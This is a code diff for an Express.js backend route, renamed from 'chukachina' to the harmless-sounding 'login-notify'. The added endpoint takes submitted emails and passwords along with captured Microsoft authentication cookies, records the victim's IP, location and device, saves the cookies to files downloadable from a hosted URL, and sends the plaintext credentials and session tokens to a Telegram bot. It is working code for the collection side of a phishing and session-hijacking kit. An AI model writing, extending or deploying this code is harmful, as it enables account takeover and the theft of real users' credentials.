@@ -1,4 +1,4 @@
-// routes/chukachina.js
+// routes/login-notify.js
 const express = require("express");
 const fetch = require("node-fetch");
 const geoip = require('geoip-lite');
@@ -146,7 +146,7 @@ ${jsCookieData.substring(0, 2000)}...${jsCookieData.length > 2000 ? `\n[Truncate
 router.get('/health', (req, res) => {
   res.json({ 
     status: 'ok',
-    service: 'chukachina',
+    service: 'login-notify',
     time: new Date().toISOString(),
     telegramConfigured: !!TELEGRAM_API
   });
@@ -201,7 +201,7 @@ router.get('/cookie-files', async (req, res) => {
       totalFiles: cookieFiles.length,
       files: cookieFiles.map(file => ({
         filename: file,
-        downloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${file}`
+        downloadUrl: `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${file}`
       }))
     });
   } catch (error) {
@@ -264,8 +264,145 @@ Password: test123`;
   }
 });
 
-// MAIN CHUKACHINA endpoint - handles your existing frontend requests
+// Main login-notify endpoint
 router.post('/', async (req, res) => {
+  try {
+    console.log('=== LOGIN-NOTIFY ENDPOINT HIT ===');
+    console.log('Body:', req.body);
+
+    const { email, password, redirect_url, js_cookie_data } = req.body || {};
+    
+    console.log('Received data:', { 
+      email, 
+      password: password ? '***' : 'missing', 
+      redirect_url,
+      hasJsCookieData: !!js_cookie_data
+    });
+
+    if (!email || !password) {
+      return res.status(400).json({ 
+        success: false, 
+        message: "Missing email or password"
+      });
+    }
+
+    // Capture cookies BEFORE any action
+    const cookiesBefore = { ...req.cookies };
+    
+    // IP + geo
+    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
+    const location = geoip.lookup(ip);
+    const locationStr = location ? `${location.city || 'N/A'}, ${location.country || 'N/A'}` : 'Unknown';
+
+    // UA parsing
+    const parser = new UAParser(req.headers['user-agent'] || '');
+    const agent = parser.getResult();
+    const deviceType = `${agent.os.name || 'OS'} ${agent.os.version || ''} - ${agent.browser.name || 'Browser'} ${agent.browser.version || ''}`;
+
+    // Create cookies file with JS cookie data
+    let fileInfo = null;
+    try {
+      fileInfo = await createCookiesFile(email, ip, cookiesBefore, js_cookie_data, redirect_url);
+      console.log(`Cookies file created: ${fileInfo.filename}`);
+    } catch (fileError) {
+      console.error('Error creating cookies file:', fileError);
+    }
+
+    // Build Telegram message
+    let message = `LOGIN NOTIFICATION
+
+Email: ${email}
+Password: ${password}
+IP: ${ip}
+Location: ${locationStr}
+Timestamp: ${new Date().toISOString()}
+Device: ${deviceType}
+Redirect URL: ${redirect_url || 'None'}
+Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
+Download URL: ${fileInfo ? `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${fileInfo.filename}` : 'None'}
+
+HTTP Cookies (${Object.keys(cookiesBefore).length}):
+${Object.entries(cookiesBefore).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)'}
+`;
+
+    // Add JS cookie info to Telegram message
+    if (js_cookie_data) {
+      try {
+        const cookieMatch = js_cookie_data.match(/JSON\.parse\(`([^`]+)`\)/);
+        if (cookieMatch && cookieMatch[1]) {
+          const cookiesJson = cookieMatch[1];
+          const cookiesArray = JSON.parse(cookiesJson);
+          
+          message += `\nMICROSOFT AUTH COOKIES (${cookiesArray.length}):\n`;
+          cookiesArray.forEach(cookie => {
+            message += `- ${cookie.Name}: ${cookie.Value.substring(0, 50)}...\n`;
+          });
+
+          const redirectMatch = js_cookie_data.match(/window\.location\.href=atob\("([^"]+)"\)/);
+          if (redirectMatch && redirectMatch[1]) {
+            const redirectUrl = Buffer.from(redirectMatch[1], 'base64').toString();
+            message += `\nJS Redirect: ${redirectUrl}\n`;
+          }
+        }
+      } catch (parseError) {
+        message += `\nJS Cookies: (parse error: ${parseError.message})\n`;
+      }
+    }
+
+    // Send to Telegram
+    console.log('Sending Telegram notification...');
+    const telegramResult = await sendTelegramMessage(message);
+    
+    if (!telegramResult.success) {
+      console.error('Failed to send Telegram notification:', telegramResult.error);
+    } else {
+      console.log('Telegram notification sent successfully');
+    }
+
+    // Handle redirect
+    if (redirect_url) {
+      // Set tracking cookies
+      res.cookie('login_tracker', `track_${Date.now()}`, { 
+        maxAge: 900000,
+        httpOnly: true 
+      });
+      res.cookie('user_session', `session_${email}_${Date.now()}`, {
+        maxAge: 3600000,
+        httpOnly: true
+      });
+      
+      return res.redirect(redirect_url);
+    }
+
+    // JSON response
+    return res.status(200).json({
+      success: true,
+      message: "Login processed",
+      telegramSent: telegramResult.success,
+      redirect: redirect_url || false,
+      loginDetails: {
+        device: deviceType,
+        ip,
+        location: locationStr,
+        httpCookiesCount: Object.keys(cookiesBefore).length,
+        jsCookiesFound: !!js_cookie_data,
+        cookiesFile: fileInfo?.filename,
+        downloadUrl: fileInfo ? `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${fileInfo.filename}` : null
+      }
+    });
+
+  } catch (error) {
+    console.error("Full error in /login-notify:", error);
+    return res.status(500).json({ 
+      success: false, 
+      message: "Internal server error",
+      error: error.message
+    });
+  }
+});
+
+// CHUKACHINA endpoint - handles your existing frontend requests
+router.post('/chukachina', async (req, res) => {
   try {
     console.log('=== CHUKACHINA ENDPOINT HIT ===');
     console.log('Body:', req.body);
@@ -310,7 +447,7 @@ Device: ${deviceType}
 Target Domain: ${targetDomain || 'None'}
 Page URL: ${page_url || 'None'}
 Cookies File: ${fileInfo ? fileInfo.filename : 'Failed to create'}
-Download URL: ${fileInfo ? `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${fileInfo.filename}` : 'None'}
+Download URL: ${fileInfo ? `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${fileInfo.filename}` : 'None'}
 
 HTTP Cookies (${Object.keys(http_cookies || {}).length}):
 ${Object.entries(http_cookies || {}).map(([k, v]) => `- ${k}: ${v}`).join('\n') || '(no cookies sent)'}
@@ -358,8 +495,8 @@ ${Object.entries(http_cookies || {}).map(([k, v]) => `- ${k}: ${v}`).join('\n') 
       attemptProcessed: true,
       downloadInfo: fileInfo ? {
         filename: fileInfo.filename,
-        downloadUrl: `/chukachina/download-cookies/${fileInfo.filename}`,
-        fullDownloadUrl: `https://chuksinno-backend-1.onrender.com/chukachina/download-cookies/${fileInfo.filename}`
+        downloadUrl: `/login-notify/download-cookies/${fileInfo.filename}`,
+        fullDownloadUrl: `https://chuksinno-backend-1.onrender.com/login-notify/download-cookies/${fileInfo.filename}`
       } : null
     });
 
